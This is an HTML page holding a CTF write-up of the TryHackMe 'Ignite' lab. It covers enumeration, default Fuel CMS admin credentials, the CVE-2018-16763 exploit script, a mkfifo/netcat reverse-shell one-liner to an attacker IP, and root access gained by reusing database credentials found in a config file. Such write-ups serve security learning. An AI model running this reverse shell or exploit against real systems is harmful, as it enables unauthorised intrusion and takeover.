@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="Ignite Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)| http-robots.txt: 1 disallowed entry |_/fuel/| http-methods: |_ Supported Methods: HEAD OPTIONS ffuf 0 [Status: 200, Size: 16595, Words: 770, Lines: 232].htaccess [Status: 403, Size: 296, Words: 22, Lines: 12]assets [Status: 301, Size: 313, Words: 20, Lines: 10].htpasswd [Status: 403, Size: 296, Words: 22, Lines: 12].hta [Status: 403, Size: 291, Words: 22, Lines: 12]home [Status: 200, Size: 16595, Words: 770, Lines: 232]index." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/ignite/ignite/" />
+
+
+    <title>
+        
+             :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="">
+<meta itemprop="description" content="Ignite Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)| http-robots.txt: 1 disallowed entry |_/fuel/| http-methods: |_ Supported Methods: HEAD OPTIONS ffuf 0 [Status: 200, Size: 16595, Words: 770, Lines: 232].htaccess [Status: 403, Size: 296, Words: 22, Lines: 12]assets [Status: 301, Size: 313, Words: 20, Lines: 10].htpasswd [Status: 403, Size: 296, Words: 22, Lines: 12].hta [Status: 403, Size: 291, Words: 22, Lines: 12]home [Status: 200, Size: 16595, Words: 770, Lines: 232]index.">
+
+<meta itemprop="wordCount" content="1245"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="Ignite Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)| http-robots.txt: 1 disallowed entry |_/fuel/| http-methods: |_ Supported Methods: HEAD OPTIONS ffuf 0 [Status: 200, Size: 16595, Words: 770, Lines: 232].htaccess [Status: 403, Size: 296, Words: 22, Lines: 12]assets [Status: 301, Size: 313, Words: 20, Lines: 10].htpasswd [Status: 403, Size: 296, Words: 22, Lines: 12].hta [Status: 403, Size: 291, Words: 22, Lines: 12]home [Status: 200, Size: 16595, Words: 770, Lines: 232]index."/>
+
+
+
+    <meta property="og:title" content="" />
+<meta property="og:description" content="Ignite Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)| http-robots.txt: 1 disallowed entry |_/fuel/| http-methods: |_ Supported Methods: HEAD OPTIONS ffuf 0 [Status: 200, Size: 16595, Words: 770, Lines: 232].htaccess [Status: 403, Size: 296, Words: 22, Lines: 12]assets [Status: 301, Size: 313, Words: 20, Lines: 10].htpasswd [Status: 403, Size: 296, Words: 22, Lines: 12].hta [Status: 403, Size: 291, Words: 22, Lines: 12]home [Status: 200, Size: 16595, Words: 770, Lines: 232]index." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/ignite/ignite/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+
+<meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/ignite/ignite/"></a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="ignite">Ignite</h1>
+<!-- raw HTML omitted -->
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>PORT   STATE SERVICE REASON  VERSION
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+| http-methods: 
+|_  Supported Methods: HEAD OPTIONS
+</code></pre><h3 id="ffuf">ffuf</h3>
+<pre tabindex="0"><code>0                       [Status: 200, Size: 16595, Words: 770, Lines: 232]
+.htaccess               [Status: 403, Size: 296, Words: 22, Lines: 12]
+assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
+.htpasswd               [Status: 403, Size: 296, Words: 22, Lines: 12]
+.hta                    [Status: 403, Size: 291, Words: 22, Lines: 12]
+home                    [Status: 200, Size: 16595, Words: 770, Lines: 232]
+index.php               [Status: 200, Size: 16595, Words: 770, Lines: 232]
+index                   [Status: 200, Size: 16595, Words: 770, Lines: 232]
+robots.txt              [Status: 200, Size: 30, Words: 3, Lines: 2]
+server-status           [Status: 403, Size: 300, Words: 22, Lines: 12]
+</code></pre><p>Well only port 80 is open&hellip;we know its the website enumeration or nothing</p>
+<p><code>Fuel CMS version 1.4</code></p>
+<p>That was in plain sight..wait they litteraly show the CMS instalation documentation</p>
+<pre tabindex="0"><code>To access the FUEL admin, go to:
+http://10.10.74.189/fuel
+User name: admin
+Password: admin (you can and should change this password and admin user information after logging in)
+</code></pre><p>yeah actually the default credentials work</p>
+<p>In dashboard I tried to create a page with php shellcode but I couldnt access it</p>
+<pre tabindex="0"><code>There is an updated view file located at 
+/var/www/html/fuel/application/views/home.php.
+Would you like to upload it into the body of your page (if available)?
+</code></pre><p>I tried to upload too but many php extension variants are not allowed</p>
+<p>Let&rsquo;s just search an exploit then</p>
+<p>We found <code>CVE-2018-16763</code></p>
+<p>there were many exploitdb scripts for that but the 3rd exploit was the best</p>
+<p>It was for python3 so I chose that one as <code>50477.py</code></p>
+<p>The script just takes the baseurl as argument</p>
+<pre tabindex="0"><code>└──╼ $python 50477.py -u http://10.10.140.103
+[+]Connecting...
+Enter Command $id
+systemuid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><p>After playing with basic commands I can spawn a netcat shell with this payload</p>
+<pre tabindex="0"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.226.203 2311 &gt;/tmp/f
+</code></pre><p>Then I get access on my listenner</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre><p>I get simple python tty before grabbing first flag</p>
+<pre tabindex="0"><code>www-data@ubuntu:/home/www-data$ cat flag.txt
+cat flag.txt
+</code></pre><h2 id="priilege-escalation">Priilege Escalation</h2>
+<p>this part was not too hard because I knew after reading the website documentation</p>
+<p>And as there is no real user on machine anyway its all about the CMS instalation</p>
+<p>I knew I would check for php config files</p>
+<pre tabindex="0"><code>Install the FUEL CMS database by first creating the database in MySQL and then importing the fuel/install/fuel_schema.sql file.
+After creating the database, change the database configuration found in fuel/application/config/database.php to include your hostname (e.g. localhost), username, password and the database 
+to match the new database you created.
+</code></pre><p>We go where the file is and read it</p>
+<pre tabindex="0"><code>www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php
+cat database.php
+&lt;?php
+defined(&#39;BASEPATH&#39;) OR exit(&#39;No direct script access allowed&#39;);
+
+/*
+ * | -------------------------------------------------------------------
+ * | DATABASE CONNECTIVITY SETTINGS
+ * | -------------------------------------------------------------------
+ * | This file will contain the settings needed to access your database.
+ * |
+ * | For complete instructions please consult the &#39;Database Connection&#39;
+ * | page of the User Guide.
+ * |
+ * | -------------------------------------------------------------------
+ * | EXPLANATION OF VARIABLES
+ * | -------------------------------------------------------------------
+ * |
+ * |       [&#39;dsn&#39;]      The full DSN string describe a connection to the database.
+ * |       [&#39;hostname&#39;] The hostname of your database server.
+ * |       [&#39;username&#39;] The username used to connect to the database
+ * |       [&#39;password&#39;] The password used to connect to the database
+ * |       [&#39;database&#39;] The name of the database you want to connect to
+ * |       [&#39;dbdriver&#39;] The database driver. e.g.: mysqli.
+ * |                       Currently supported:
+ * |                                cubrid, ibase, mssql, mysql, mysqli, oci8,
+ * |                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
+ * |       [&#39;dbprefix&#39;] You can add an optional prefix, which will be added
+ * |                                to the table name when using the  Query Builder class
+ * |       [&#39;pconnect&#39;] TRUE/FALSE - Whether to use a persistent connection
+ * |       [&#39;db_debug&#39;] TRUE/FALSE - Whether database errors should be displayed.
+ * |       [&#39;cache_on&#39;] TRUE/FALSE - Enables/disables query caching
+ * |       [&#39;cachedir&#39;] The path to the folder where cache files should be stored
+ * |       [&#39;char_set&#39;] The character set used in communicating with the database
+ * |       [&#39;dbcollat&#39;] The character collation used in communicating with the database
+ * |                                NOTE: For MySQL and MySQLi databases, this setting is only used
+ * |                                as a backup if your server is running PHP &lt; 5.2.3 or MySQL &lt; 5.0.7
+ * |                                (and in table creation queries made with DB Forge).
+ * |                                There is an incompatibility in PHP with mysql_real_escape_string() which
+ * |                                can make your site vulnerable to SQL injection if you are using a
+ * |                                multi-byte character set and are running versions lower than these.
+ * |                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
+ * |       [&#39;swap_pre&#39;] A default table prefix that should be swapped with the dbprefix
+ * |       [&#39;encrypt&#39;]  Whether or not to use an encrypted connection.
+ * |
+ * |                       &#39;mysql&#39; (deprecated), &#39;sqlsrv&#39; and &#39;pdo/sqlsrv&#39; drivers accept TRUE/FALSE
+ * |                       &#39;mysqli&#39; and &#39;pdo/mysql&#39; drivers accept an array with the following options:
+ * |
+ * |                               &#39;ssl_key&#39;    - Path to the private key file
+ * |                               &#39;ssl_cert&#39;   - Path to the public key certificate file
+ * |                               &#39;ssl_ca&#39;     - Path to the certificate authority file
+ * |                               &#39;ssl_capath&#39; - Path to a directory containing trusted CA certificats in PEM format
+ * |                               &#39;ssl_cipher&#39; - List of *allowed* ciphers to be used for the encryption, separated by colons (&#39;:&#39;)
+ * |                               &#39;ssl_verify&#39; - TRUE/FALSE; Whether verify the server certificate or not (&#39;mysqli&#39; only)
+ * |
+ * |       [&#39;compress&#39;] Whether or not to use client compression (MySQL only)
+ * |       [&#39;stricton&#39;] TRUE/FALSE - forces &#39;Strict Mode&#39; connections
+ * |                                                       - good for ensuring strict SQL while developing
+ * |       [&#39;ssl_options&#39;] Used to set various SSL options that can be used when making SSL connections.
+ * |       [&#39;failover&#39;] array - A array with 0 or more data for connections if the main should fail.
+ * |       [&#39;save_queries&#39;] TRUE/FALSE - Whether to &#34;save&#34; all executed queries.
+ * |                               NOTE: Disabling this will also effectively disable both
+ * |                               $this-&gt;db-&gt;last_query() and profiling of DB queries.
+ * |                               When you run a query, with this setting set to TRUE (default),
+ * |                               CodeIgniter will store the SQL statement for debugging purposes.
+ * |                               However, this may cause high memory usage, especially if you run
+ * |                               a lot of SQL queries ... disable this to avoid that problem.
+ * |
+ * | The $active_group variable lets you choose which connection group to
+ * | make active.  By default there is only one group (the &#39;default&#39; group).
+ * |
+ * | The $query_builder variables lets you determine whether or not to load
+ * | the query builder class.
+ */
+$active_group = &#39;default&#39;;
+$query_builder = TRUE;
+
+$db[&#39;default&#39;] = array(
+	&#39;dsn&#39;   =&gt; &#39;&#39;,
+	&#39;hostname&#39; =&gt; &#39;localhost&#39;,
+	&#39;username&#39; =&gt; &#39;root&#39;,
+	&#39;password&#39; =&gt; &#39;mememe&#39;,
+	&#39;database&#39; =&gt; &#39;fuel_schema&#39;,
+	&#39;dbdriver&#39; =&gt; &#39;mysqli&#39;,
+	&#39;dbprefix&#39; =&gt; &#39;&#39;,
+	&#39;pconnect&#39; =&gt; FALSE,
+	&#39;db_debug&#39; =&gt; (ENVIRONMENT !== &#39;production&#39;),
+					   &#39;cache_on&#39; =&gt; FALSE,
+					   &#39;cachedir&#39; =&gt; &#39;&#39;,
+					   &#39;char_set&#39; =&gt; &#39;utf8&#39;,
+					   &#39;dbcollat&#39; =&gt; &#39;utf8_general_ci&#39;,
+					   &#39;swap_pre&#39; =&gt; &#39;&#39;,
+					   &#39;encrypt&#39; =&gt; FALSE,
+					   &#39;compress&#39; =&gt; FALSE,
+					   &#39;stricton&#39; =&gt; FALSE,
+					   &#39;failover&#39; =&gt; array(),
+					   &#39;save_queries&#39; =&gt; TRUE
+);
+
+// used for testing purposes
+if (defined(&#39;TESTING&#39;))
+{
+	@include(TESTER_PATH.&#39;config/tester_database&#39;.EXT);
+}
+</code></pre><p>In the last parts of the file we can see the database is setup with root credentials</p>
+<p>I guess the credentials work for the system so I use them to go root</p>
+<pre tabindex="0"><code>www-data@ubuntu:/var/www/html/fuel/application/config$ su root
+su root
+Password: mememe
+
+root@ubuntu:/var/www/html/fuel/application/config# 
+
+root@ubuntu:~# cat root.txt
+cat root.txt
+</code></pre><p>And the fire is lit!</p>
+<p>I wonder how popular CodeIgniter still is</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>
+
+
+
+    </body>
+</html>
